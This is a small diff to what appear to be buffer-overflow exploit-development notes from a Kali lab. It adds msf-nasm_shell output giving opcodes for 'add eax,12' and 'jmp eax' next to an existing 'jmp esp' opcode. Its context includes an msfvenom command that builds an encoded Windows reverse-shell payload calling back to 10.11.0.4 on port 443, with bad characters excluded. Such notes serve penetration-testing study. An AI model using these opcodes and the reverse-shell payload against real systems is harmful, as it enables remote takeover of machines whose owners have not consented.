@@ -121,6 +121,11 @@ kali@kali:~$ msf-nasm_shell
 nasm > jmp esp
 00000000 FFE4 jmp esp nasm >
 
+kali@kali:~$ msf-nasm_shell nasm > add eax,12
+00000000 83C00C add eax,byte +0xc
+nasm > jmp eax
+00000000 FFE0 jmp eax
+
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 ```
 
